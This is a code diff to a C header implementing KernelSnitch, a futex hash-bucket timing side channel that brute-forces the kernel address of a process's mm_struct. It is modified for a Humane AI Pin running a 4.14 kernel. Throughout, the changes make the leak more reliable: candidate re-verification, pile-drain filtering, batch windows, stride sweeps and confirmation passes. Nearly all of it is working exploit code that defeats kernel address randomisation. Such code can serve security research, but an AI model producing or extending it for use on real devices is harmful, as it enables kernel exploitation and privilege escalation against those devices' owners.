@@ -1,3 +1,6 @@
+/* SPDX-License-Identifier: Apache-2.0
+ * Modified for bounded, verified Humane AI Pin timing searches.
+ */
 #pragma once
 
 #include "timeutils.h"
@@ -88,6 +91,8 @@ struct kernelsnitch_shared_state {
     volatile size_t *times;
     volatile size_t found;
     volatile size_t mm_struct;
+    volatile size_t mm_batch;   /* pool window that produced mm_struct */
+    volatile size_t cand_cnt;   /* verified candidate pool size (anchor + kept) */
 
     pthread_t *tids;
     size_t identity_diff;
@@ -96,6 +101,59 @@ struct kernelsnitch_shared_state {
 
     int mte_enabled;
 };
+
+enum kernelsnitch_found_state {
+    KERNELSNITCH_SEARCHING = 0,
+    KERNELSNITCH_MM_READY = 1,
+    KERNELSNITCH_MM_PUBLISHING = 2,
+};
+
+static size_t __ks_found_load(struct kernelsnitch_shared_state *ks)
+{
+    return __atomic_load_n(&ks->found, __ATOMIC_ACQUIRE);
+}
+
+static size_t __ks_mm_load(struct kernelsnitch_shared_state *ks)
+{
+    return __atomic_load_n(&ks->mm_struct, __ATOMIC_ACQUIRE);
+}
+
+static size_t __ks_mm_batch_load(struct kernelsnitch_shared_state *ks)
+{
+    return __atomic_load_n(&ks->mm_batch, __ATOMIC_ACQUIRE);
+}
+
+static void __ks_reset_mm_result(struct kernelsnitch_shared_state *ks)
+{
+    __atomic_store_n(&ks->mm_struct, (size_t)-1, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->mm_batch, 0, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->found, KERNELSNITCH_SEARCHING, __ATOMIC_RELEASE);
+}
+
+static void __ks_restore_mm_result(struct kernelsnitch_shared_state *ks,
+                                   size_t mm_struct, size_t batch)
+{
+    __atomic_store_n(&ks->found, KERNELSNITCH_MM_PUBLISHING,
+                     __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->mm_struct, mm_struct, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->mm_batch, batch, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->found, KERNELSNITCH_MM_READY, __ATOMIC_RELEASE);
+}
+
+static int __ks_publish_mm_result(struct kernelsnitch_shared_state *ks,
+                                  size_t mm_struct, size_t batch)
+{
+    size_t expected = KERNELSNITCH_SEARCHING;
+    if (!__atomic_compare_exchange_n(&ks->found, &expected,
+                                     KERNELSNITCH_MM_PUBLISHING, 0,
+                                     __ATOMIC_ACQ_REL, __ATOMIC_ACQUIRE))
+        return 0;
+
+    __atomic_store_n(&ks->mm_struct, mm_struct, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->mm_batch, batch, __ATOMIC_RELAXED);
+    __atomic_store_n(&ks->found, KERNELSNITCH_MM_READY, __ATOMIC_RELEASE);
+    return 1;
+}
 
 #define WAIT() do { for (size_t i = 0; i < 2; ++i) sched_yield(); } while (0)
 
@@ -115,12 +173,14 @@ static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const st
 struct inc_arg {
     struct kernelsnitch_shared_state *ks;
     size_t id;
+    volatile size_t *entered;
 };
 static void *__do_increase(void *arg)
 {
     struct inc_arg *inc_arg = (struct inc_arg *)arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
+    __atomic_fetch_add(inc_arg->entered, 1, __ATOMIC_RELEASE);
     SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, NULL, NULL, 0));
     free(inc_arg);
     return 0;
@@ -132,16 +192,51 @@ static void *__do_increase(void *arg)
  * @arg id: identifier of the futex user-space address to be used for the increase
  * @arg amount: increase
  */
-static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
+static size_t __increase(struct kernelsnitch_shared_state *ks, size_t id,
+                         size_t amount)
 {
     pthread_t tid;
+    size_t created = 0, failed = 0, last_errno = 0;
+    volatile size_t entered = 0;
+    pthread_attr_t attr;
+    int attr_rc = pthread_attr_init(&attr);
+    if (attr_rc != 0) {
+        pr_warning("DBG __increase detached attr failed rc=%d\n", attr_rc);
+        return 0;
+    }
+    attr_rc = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);
+    if (attr_rc != 0) {
+        pthread_attr_destroy(&attr);
+        pr_warning("DBG __increase detached attr failed rc=%d\n", attr_rc);
+        return 0;
+    }
+    pr_warning("DBG __increase enter id=%zu amount=%zu\n", id, amount);
     for (size_t i = 0; i < amount; ++i) {
         struct inc_arg *inc_arg = calloc(1, sizeof(struct inc_arg));
         inc_arg->id = id;
         inc_arg->ks = ks;
-        SYSCHK(pthread_create(&tid, 0, __do_increase, (void *)inc_arg));
+        inc_arg->entered = &entered;
+        int rc = pthread_create(&tid, &attr, __do_increase, (void *)inc_arg);
+        if (rc == 0) { created++; }
+        else { failed++; last_errno = rc; free(inc_arg); }
+        if ((i % 512) == 511)
+            pr_warning("DBG __increase progress i=%zu created=%zu failed=%zu\n", i+1, created, failed);
     }
-    WAIT();
+    pthread_attr_destroy(&attr);
+    pr_warning("DBG __increase done id=%zu created=%zu failed=%zu last_errno=%zu\n", id, created, failed, last_errno);
+    for (size_t spins = 0;
+         spins < 65536 &&
+             __atomic_load_n(&entered, __ATOMIC_ACQUIRE) < created;
+         ++spins)
+        sched_yield();
+    size_t entered_final = __atomic_load_n(&entered, __ATOMIC_ACQUIRE);
+    for (int y = 0; y < 32; ++y)
+        sched_yield();
+    pr_warning("DBG __increase wait done entered=%zu/%zu detached=1\n",
+               entered_final, created);
+    if (entered_final != created)
+        return 0;
+    return created;
 }
 
 /**
@@ -159,6 +254,7 @@ static int __compare(const void *a, const void *b)
  * @arg futex_addr: user-space address of the futex (required only to be a mapped memory)
  * @return averaged time of the futex wait operation
  */
+static size_t g_last_measure_min, g_last_measure_med, g_last_measure_max;
 static size_t __measure(size_t futex_addr)
 {
     size_t t0;
@@ -169,14 +265,18 @@ static size_t __measure(size_t futex_addr)
     for (size_t l = 0; l < REPEAT_MEASUREMENT; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0));
+        long wr = __futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, NULL, NULL, 0);
         t1 = rdtsc_end();
+        if (wr < 0) pr_warning("measure: futex_wake errno=%d\n", errno);
         __times[l] = t1 - t0;
     }
     qsort(__times, REPEAT_MEASUREMENT, sizeof(size_t), __compare);
     for (size_t l = 0; l < AVERAGE; ++l)
         time += __times[l];
     time /= AVERAGE;
+    g_last_measure_min = __times[0];
+    g_last_measure_med = __times[REPEAT_MEASUREMENT/2];
+    g_last_measure_max = __times[REPEAT_MEASUREMENT-1];
     return time;
 }
 
@@ -193,52 +293,178 @@ struct range {
 struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
+    size_t stride;
+    size_t batch_off;   /* window into ks->futex_addrs pool */
 };
 static void *__mm_leak(void *arg)
 {
     struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
     struct range *range = &mm_leak_arg->range;
+    /* Diagnosis counters: how many candidates satisfy k-of-N hash
+     * equalities.  With a correct model and 2048 buckets the expected
+     * counts over an N-candidate scan are N/2048^3 (k=3) and
+     * N/2048^4 (k=4); zero k>=2 hits means the hash model is wrong. */
+    size_t diag_eq[7] = {0};
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
     size_t mm_slab_sz = KS_PAGE_SIZE << ks->mm_slab_order;
-    for (size_t coarse_addr = range->start; (coarse_addr < range->end) && !ks->found; coarse_addr += COARSE_SZ) {
+    size_t batch_off = mm_leak_arg->batch_off;
+    for (size_t coarse_addr = range->start;
+         (coarse_addr < range->end) &&
+             __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
+         coarse_addr += COARSE_SZ) {
+        /*
+         * The top range ends at 2^64; coarse_addr wraps to 0 there and
+         * would restart the scan over non-linear garbage forever.
+         */
+        if (coarse_addr < range->start)
+            break;
         if ((coarse_addr % (1ULL << 40)) == 0)
             if (ks->verbose) pr_info("[% 3zd] [%016zx-%016llx]\n", range->id, coarse_addr, coarse_addr + (1ULL << 40));
-        for (size_t slab_addr = coarse_addr; (slab_addr < coarse_addr + COARSE_SZ) && !ks->found; slab_addr += mm_slab_sz) {
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
+        for (size_t slab_addr = coarse_addr;
+             (slab_addr < coarse_addr + COARSE_SZ) &&
+                 __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
+             slab_addr += mm_slab_sz) {
+            (void)mm_slab_sz;
+            for (size_t mm_struct_candidate = slab_addr;
+                 (mm_struct_candidate < slab_addr + mm_slab_sz) &&
+                     __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
+                 mm_struct_candidate += mm_leak_arg->stride) {
 
                 size_t found_hash = 1;
                 if (!ks->mte_enabled) {
-                    // test the mm_struct candidate
-                    for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                        found_hash = (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
-                    if (found_hash) {
-                        ks->mm_struct = mm_struct_candidate;
-                        ks->found = 1;
+                    // test the mm_struct candidate (early exit: 1/2048 of
+                    // candidates survive the first comparison, so the
+                    // average cost is ~1 hash instead of `collisions`)
+                    uint32_t h0 = futex_hash(ks->futex_addrs[batch_off], mm_struct_candidate);
+                    size_t eq = 1;
+                    for (size_t i = 1; i < ks->collisions; ++i) {
+                        if (h0 != futex_hash(ks->futex_addrs[batch_off + i], mm_struct_candidate))
+                            { found_hash = 0; break; }
+                        eq++;
+                    }
+                    diag_eq[eq <= 6 ? eq : 6]++;
+                    if (found_hash &&
+                        __ks_publish_mm_result(ks, mm_struct_candidate,
+                                               batch_off)) {
                         break;
                     }
                 } else {
                     // need to set the tag if mte is enabled
-                    for (size_t tag_candidate = 0; tag_candidate < 15 && !ks->found; ++tag_candidate) {
+                    for (size_t tag_candidate = 0;
+                         tag_candidate < 15 &&
+                             __ks_found_load(ks) == KERNELSNITCH_SEARCHING;
+                         ++tag_candidate) {
                         size_t __mm_struct_candidate = mm_struct_candidate & ~(0xfULL << 56);
                         __mm_struct_candidate |= (tag_candidate << 56);
                         found_hash = 1;
                         for (size_t i = 1; i < ks->collisions && found_hash; ++i)
-                            found_hash = (futex_hash(ks->futex_addrs[0], __mm_struct_candidate) == futex_hash(ks->futex_addrs[i], __mm_struct_candidate));
+                            found_hash = (futex_hash(ks->futex_addrs[batch_off], __mm_struct_candidate) == futex_hash(ks->futex_addrs[batch_off + i], __mm_struct_candidate));
                         if (found_hash) {
                             if (ks->verbose)
                                 pr_info("found mm_struct %016zx\n", __mm_struct_candidate);
-                            ks->mm_struct = __mm_struct_candidate;
-                            ks->found = 1;
-                            break;
+                            if (__ks_publish_mm_result(
+                                    ks, __mm_struct_candidate, batch_off))
+                                break;
                         }
                     }
-                } 
+                }
             }
         }
     }
+    if (ks->verbose) {
+        pr_warning("DBG bruteforce diag batch=%zu [%016zx-%016zx] eq1=%zu eq2=%zu eq3=%zu eq4=%zu eq5=%zu eq6=%zu\n",
+                 batch_off, range->start, range->end, diag_eq[1], diag_eq[2],
+                 diag_eq[3], diag_eq[4], diag_eq[5], diag_eq[6]);
+    }
     free(mm_leak_arg);
     return 0;
+}
+
+static int __ks_run_mm_batch(struct kernelsnitch_shared_state *ks,
+                             size_t batch, size_t stride)
+{
+    size_t created = 0;
+    size_t joined = 0;
+    int create_rc = 0;
+
+    __ks_reset_mm_result(ks);
+    for (size_t i = 0; i < ks->thread_cnt; ++i) {
+        struct mm_leak_arg *mm_leak_arg = calloc(1, sizeof(*mm_leak_arg));
+        if (!mm_leak_arg) {
+            create_rc = ENOMEM;
+            break;
+        }
+        mm_leak_arg->ks = ks;
+        mm_leak_arg->range.id = i;
+        /* Scan the linear window from the top down. */
+        size_t idx = ks->thread_cnt - 1 - i;
+        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*idx;
+        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(idx+1);
+        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
+            mm_leak_arg->range.start &= ~(COARSE_SZ - 1);
+        if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
+            mm_leak_arg->range.end =
+                (mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ;
+        /* The top VA39 range wraps at 2^64. */
+        if (mm_leak_arg->range.end <= mm_leak_arg->range.start)
+            mm_leak_arg->range.end = (size_t)-1;
+        mm_leak_arg->stride = stride;
+        mm_leak_arg->batch_off = batch;
+
+        create_rc = pthread_create(&ks->tids[i], 0, __mm_leak,
+                                   mm_leak_arg);
+        if (create_rc != 0) {
+            free(mm_leak_arg);
+            break;
+        }
+        created++;
+    }
+
+    if (created != ks->thread_cnt) {
+        /* Stop any workers already launched; this batch cannot be trusted. */
+        __atomic_store_n(&ks->found, KERNELSNITCH_MM_PUBLISHING,
+                         __ATOMIC_RELEASE);
+    }
+    for (size_t i = 0; i < created; ++i) {
+        int join_rc = pthread_join(ks->tids[i], 0);
+        if (join_rc != 0)
+            pr_error("KernelSnitch pthread_join failed worker=%zu rc=%d\n",
+                     i, join_rc);
+        joined++;
+    }
+
+    pr_warning("DBG batch workers batch=%zu stride=%zu created=%zu joined=%zu required=%zu create_rc=%d\n",
+               batch, stride, created, joined, ks->thread_cnt, create_rc);
+    if (created != ks->thread_cnt || joined != ks->thread_cnt) {
+        pr_warning("DBG batch rejected: incomplete worker set\n");
+        __ks_reset_mm_result(ks);
+        return 0;
+    }
+    return 1;
+}
+
+static int __ks_validate_mm_pool(struct kernelsnitch_shared_state *ks,
+                                 size_t mm_struct, size_t pool)
+{
+    if (pool < ks->collisions) {
+        pr_warning("DBG mm corroboration rejected: pool=%zu collisions=%zu\n",
+                   pool, ks->collisions);
+        return 0;
+    }
+
+    uint32_t expected = futex_hash(ks->futex_addrs[0], mm_struct);
+    for (size_t i = 1; i < pool; ++i) {
+        uint32_t actual = futex_hash(ks->futex_addrs[i], mm_struct);
+        if (actual != expected) {
+            pr_warning("DBG mm corroboration mismatch index=%zu expected=%u actual=%u\n",
+                       i, expected, actual);
+            return 0;
+        }
+    }
+    pr_warning("DBG mm corroboration pool_matches=%zu/%zu bucket=%u\n",
+               pool, pool, expected);
+    return 1;
 }
 
 /****************************************************************************************************************/
@@ -258,7 +484,8 @@ static void *__mm_leak(void *arg)
 struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size_t __mm_slab_order, size_t __thread_cnt, size_t __collision_cnt, size_t __verbose, size_t __mte_enabled)
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
-    ks->mm_struct = -1;
+    __ks_reset_mm_result(ks);
+    ks->cand_cnt = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
     ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
@@ -277,7 +504,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
     ks->identity_diff = ((IDENTITY_END - IDENTITY_START)/ks->thread_cnt);
 
-    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*64, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
 
     if (ks->verbose) pr_info("parameters cpu (%zd) mm_struct sz (%zx) mm slab order (%zd) thread cnt (%zd) collisions (%zd) mte %s\n",
         ks->cpu_cnt,
@@ -288,6 +515,11 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mte_enabled ? "enabled" : "disabled");
     pin_to_core(0);
     futex_init();
+    if (futex_hashsize != 2048) {
+        pr_error("KernelSnitch effective hashsize=%lu; expected 2048\n",
+                 futex_hashsize);
+    }
+    pr_warning("KernelSnitch effective hashsize=%lu\n", futex_hashsize);
 
     ks->state = KERNELSNITCH_INIT;
     return ks;
@@ -301,7 +533,7 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
 {
     #define ID 128
 #ifndef KERNELSNITCH_THRESHOLD_MULT
-#define KERNELSNITCH_THRESHOLD_MULT 10
+#define KERNELSNITCH_THRESHOLD_MULT 3  /* Lowered from 10 for 4.14 kernel */
 #endif
     size_t count = 0;
     size_t wanted;
@@ -311,29 +543,150 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     wanted = ks->collisions - 1;
 
-    size_t approx_time = MIN(__measure((size_t)&ks->futexes[0]), __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]));
+    size_t m_empty1 = __measure((size_t)&ks->futexes[0]);
+    size_t m_empty2 = __measure((size_t)&ks->futexes[KS_PAGE_SIZE+8]);
+    size_t approx_time = MIN(m_empty1, m_empty2);
+    pr_warning("DBG empty-bucket measure1=%zu (min %zu med %zu max %zu) measure2=%zu\n",
+             m_empty1, g_last_measure_min, g_last_measure_med, g_last_measure_max, m_empty2);
 
     // piled-up hash bucket ID 128
     // here, I append 4096 futexes to this hash bucket creating a distinction between most other empty or lightly populated ones
-    __increase(ks, ID, APPENDED_FUTEXES);
+    size_t pile_created = __increase(ks, ID, APPENDED_FUTEXES);
+    /*
+     * Do not call __measure() on the pile futex itself.  This vendor 4.14
+     * futex_wake() wakes one matching waiter even when nr_wake is zero:
+     * mark_wake_futex() runs before `if (++ret >= nr_wake)`.  __measure()
+     * repeats the call 128 times, so the old contrast probe silently removed
+     * exactly 128 of the 4096 waiters (live drain telemetry: 3968/4096).
+     * Candidate addresses use distinct futex keys and therefore traverse the
+     * piled bucket without matching or waking its waiters.  Check contrast on
+     * those candidates below, then require the final drain to wake all 4096.
+     */
+    pr_warning("DBG piled-bucket(ID=%d) direct measure deferred (nr_wake=0 is destructive on 4.14)\n",
+             ID);
+    pr_warning("DBG threshold = approx*%d = %zu\n", KERNELSNITCH_THRESHOLD_MULT,
+             approx_time*KERNELSNITCH_THRESHOLD_MULT);
+    if (pile_created != APPENDED_FUTEXES || approx_time == 0) {
+        int woken = __futex((unsigned int *)&ks->inc_futex[ID],
+                            FUTEX_WAKE_PRIVATE, 0x7fffffff,
+                            NULL, NULL, 0);
+        pr_warning("DBG pile gate rejected created=%zu/%d woken=%d "
+                   "empty=%zu\n",
+                   pile_created, APPENDED_FUTEXES, woken,
+                   approx_time);
+        ks->cand_cnt = 0;
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        return;
+    }
     if (ks->verbose) pr_info("start finding collisisons\n");
 
     // find futex user space address which collide with the piled-up hash bucket ID 128
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
-    for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+    size_t dbg_max = 0, dbg_sum = 0, dbg_n = 0;
+    for (size_t i = 2; i < ks->total_futexes && count < 60; ++i) {
         id = (i * KS_PAGE_SIZE) | (i * 8 % KS_PAGE_SIZE);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
         ks->times[i] = __measure(futex_addr);
+        dbg_sum += ks->times[i]; dbg_n++;
+        if (ks->times[i] > dbg_max) dbg_max = ks->times[i];
+        if ((dbg_n % 8192) == 0)
+            pr_warning("DBG scan progress n=%zu avg=%zu max=%zu count=%zu\n",
+                     dbg_n, dbg_sum/dbg_n, dbg_max, count);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+            /*
+             * 3x re-verification: unrelated busy buckets that spike once
+             * (transient system activity) usually re-measure fast; a true
+             * pile-bucket member stays slow across repeated measures.
+             * Require the spike to reproduce on two fresh measurements
+             * before accepting the candidate.
+             */
+            size_t re1 = __measure(futex_addr);
+            size_t re2 = __measure(futex_addr);
+            size_t thr = approx_time*KERNELSNITCH_THRESHOLD_MULT;
+            if (re1 <= thr || re2 <= thr) {
+                pr_warning("DBG candidate at i=%zu rejected re-verify (%zu/%zu vs thr %zu)\n",
+                         i, re1, re2, thr);
+                continue;
+            }
             count++;
             ks->futex_addrs[count] = futex_addr;
+            pr_warning("DBG collision candidate #%zu at i=%zu time=%zu re=%zu/%zu (min %zu med %zu max %zu)\n",
+                     count, i, ks->times[i], re1, re2, g_last_measure_min, g_last_measure_med, g_last_measure_max);
             if (ks->verbose) pr_info("  %016zx\n", futex_addr);
         }
     }
-    if (wanted == count) {
+    pr_warning("DBG scan done: measured=%zu avg=%zu max=%zu collisions_found=%zu wanted=%zu\n",
+             dbg_n, dbg_n ? dbg_sum/dbg_n : 0, dbg_max, count, wanted);
+
+    /*
+     * Drain-discrimination.  A 4.14 kernel has only ~2048 global futex
+     * buckets shared by every process, so an Android system keeps many
+     * non-empty buckets whose walk latency also crosses the naive
+     * threshold; those "candidates" correlate with nothing and make the
+     * mm preimage search unsatisfiable (observed: five-equality solution
+     * count zero over the entire 256 GB linear window).  A true
+     * pile-bucket candidate is distinguished deterministically: after
+     * waking the whole pile, its wake latency collapses to ~empty, while
+     * an unrelated busy bucket stays slow.  Keep only collapsing
+     * candidates.
+     */
+    size_t m_before[64];
+    if (count > 60)
+        count = 60;
+    for (size_t k = 1; k <= count; ++k)
+        m_before[k] = __measure(ks->futex_addrs[k]);
+    int pile_woken = __futex((unsigned int *)&ks->inc_futex[ID],
+                             FUTEX_WAKE_PRIVATE, 0x7fffffff,
+                             NULL, NULL, 0);
+    pr_warning("DBG pile drain woken=%d/%d\n",
+               pile_woken, APPENDED_FUTEXES);
+    for (int y = 0; y < 32; ++y)
+        sched_yield();
+    /*
+     * Keep the whole verified pool (bounded), not exactly `wanted`:
+     * the bruteforce tries consecutive windows of ks->collisions
+     * addresses, so a few drain-verification false positives no longer
+     * poison the only batch.
+     */
+    size_t kept = 0;
+    const size_t keep_max = 24;
+    size_t min_kept_before = (size_t)-1;
+    for (size_t k = 1; k <= count; ++k) {
+        size_t m_after = __measure(ks->futex_addrs[k]);
+        const char *verdict =
+            (m_before[k] / 3 > m_after) ? "PILE" : "unrelated";
+        pr_warning("DBG candidate #%zu verify before=%zu after=%zu %s\n",
+                 k, m_before[k], m_after, verdict);
+        if (m_before[k] / 3 > m_after && kept < keep_max) {
+            kept++;
+            if (m_before[k] < min_kept_before)
+                min_kept_before = m_before[k];
+            ks->futex_addrs[kept] = ks->futex_addrs[k];
+        }
+    }
+    count = kept;
+    ks->cand_cnt = kept + 1;    /* pool = anchor + kept, futex_addrs[0..kept] */
+    pr_warning("DBG drain filter kept=%zu of wanted=%zu pool=%zu\n", kept, wanted, ks->cand_cnt);
+
+    int contrast_ok = kept > 0 &&
+        min_kept_before >= approx_time * 10;
+    pr_warning("DBG contrast gate min_kept=%zu empty=%zu ratio=%zux ok=%d\n",
+               min_kept_before, approx_time,
+               (kept > 0 && approx_time) ? min_kept_before / approx_time : 0,
+               contrast_ok);
+
+    if (pile_woken != APPENDED_FUTEXES || !contrast_ok) {
+        pr_warning("DBG pile drain rejected: woken=%d expected=%d contrast_ok=%d\n",
+                   pile_woken, APPENDED_FUTEXES, contrast_ok);
+        ks->cand_cnt = 0;
+        ks->state = KERNELSNITCH_COLLISIONS_NOT_FOUND;
+        return;
+    }
+
+    if (kept >= wanted) {
         if (ks->verbose) pr_info("found %zd collisisons\n", count);
         ks->state = KERNELSNITCH_COLLISIONS_FOUND;
     } else {
@@ -357,21 +710,107 @@ void kernelsnitch_bruteforce(struct kernelsnitch_shared_state *ks)
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
 
-    for (size_t i = 0; i < ks->thread_cnt; ++i) {
-        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-        mm_leak_arg->ks = ks;
-        mm_leak_arg->range.id = i;
-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
-        if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
-            mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
-            mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
-        SYSCHK(pthread_create(&ks->tids[i], 0, __mm_leak, mm_leak_arg));
+    /* Diagnostic/override: candidate strides.  The mm_struct SLUB stride
+     * is assumed 0x380 (size 0x370, HWCACHE_ALIGN), but on this build
+     * mm_struct comes out of a merged kmalloc cache and the empirically
+     * recovered mm is only known to be >=128-aligned (kmalloc-1024 slab
+     * objects are 128..1024 aligned).  Sweep cheap coarse strides first,
+     * then fall back to every 8-byte-aligned value.
+     * AI_PIN_KS_STRIDE pins a single stride for experiments. */
+    size_t strides[3] = { ks->mm_struct_sz, 128, 8 };
+    size_t stride_cnt = 3;
+    {
+        const char *stride_env = getenv("AI_PIN_KS_STRIDE");
+        if (stride_env && *stride_env) {
+            unsigned long long value = strtoull(stride_env, NULL, 0);
+            if (value >= 8 && value <= 0x8000) {
+                strides[0] = (size_t)value;
+                strides[1] = (size_t)value;
+                strides[2] = (size_t)value;
+                stride_cnt = 1;
+                pr_warning("KS stride override=%zu\n", strides[0]);
+            }
+        }
     }
-    for (size_t i = 0; i < ks->thread_cnt; ++i)
-        pthread_join(ks->tids[i], 0);
-    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+
+    /*
+     * The candidate pool (ks->cand_cnt entries, futex_addrs[0] = pile
+     * anchor) may contain a few drain-verification false positives; a
+     * single poisoned address makes a batch unsatisfiable.  Try every
+     * consecutive window of ks->collisions addresses, reporting which
+     * batch resolves an mm.  Each window is scanned with the fast SLUB
+     * stride first, then (if nothing resolved anywhere) every window
+     * is retried with the 8-byte-aligned stride.
+    */
+    size_t pool = ks->cand_cnt ? ks->cand_cnt : ks->collisions;
+    size_t resolved_mm = (size_t)-1;
+    size_t resolved_batch = 0;
+    size_t resolved_stride = 0;
+    int worker_failure = 0;
+    for (size_t s = 0; s < stride_cnt && resolved_mm == (size_t)-1; ++s) {
+        size_t stride = strides[s];
+        for (size_t batch = 0;
+             batch + ks->collisions <= pool &&
+                 resolved_mm == (size_t)-1;
+             ++batch) {
+            if (ks->verbose || 1)
+                pr_warning("DBG batch window=%zu stride=%zu pool=%zu\n", batch, stride, pool);
+            if (!__ks_run_mm_batch(ks, batch, stride)) {
+                worker_failure = 1;
+                break;
+            }
+            if (__ks_found_load(ks) == KERNELSNITCH_MM_READY) {
+                resolved_mm = __ks_mm_load(ks);
+                resolved_batch = __ks_mm_batch_load(ks);
+                resolved_stride = stride;
+                pr_warning("DBG batch window=%zu stride=%zu resolved mm=%016zx\n",
+                           resolved_batch, stride, resolved_mm);
+            }
+        }
+        if (worker_failure)
+            break;
+    }
+
+    if (worker_failure || resolved_mm == (size_t)-1)
+        goto reject_mm;
+    if (!__ks_validate_mm_pool(ks, resolved_mm, pool))
+        goto reject_mm;
+
+    if (pool >= 2 * ks->collisions) {
+        const size_t confirmation_batches[2] = { 0, ks->collisions };
+        for (size_t i = 0; i < 2; ++i) {
+            size_t confirmation_batch = confirmation_batches[i];
+            size_t confirmation_mm = resolved_mm;
+            if (confirmation_batch != resolved_batch) {
+                if (!__ks_run_mm_batch(ks, confirmation_batch,
+                                       resolved_stride)) {
+                    worker_failure = 1;
+                    goto reject_mm;
+                }
+                confirmation_mm =
+                    __ks_found_load(ks) == KERNELSNITCH_MM_READY
+                        ? __ks_mm_load(ks) : (size_t)-1;
+            }
+            pr_warning("DBG mm disjoint confirmation group=%zu batch=%zu primary_batch=%zu primary=%016zx confirmation=%016zx\n",
+                       i, confirmation_batch, resolved_batch, resolved_mm,
+                       confirmation_mm);
+            if (confirmation_mm != resolved_mm)
+                goto reject_mm;
+        }
+    } else {
+        pr_warning("DBG mm disjoint confirmation unavailable pool=%zu collisions=%zu primary_batch=%zu\n",
+                   pool, ks->collisions, resolved_batch);
+    }
+
+    __ks_restore_mm_result(ks, resolved_mm, resolved_batch);
+    ks->state = KERNELSNITCH_MM_FOUND;
+    return;
+
+reject_mm:
+    pr_warning("DBG mm rejected workers_ok=%d resolved=%016zx\n",
+               !worker_failure, resolved_mm);
+    __ks_reset_mm_result(ks);
+    ks->state = KERNELSNITCH_MM_NOT_FOUND;
 }
 
 /**
@@ -386,7 +825,7 @@ size_t kernelsnitch_cleanup(struct kernelsnitch_shared_state *ks)
     ks->times = 0;
     munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
     ks->tids = 0;
-    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
+    munmap((void *)ks->futex_addrs, sizeof(size_t)*64);
     ks->futex_addrs = 0;
     munmap((void *)ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
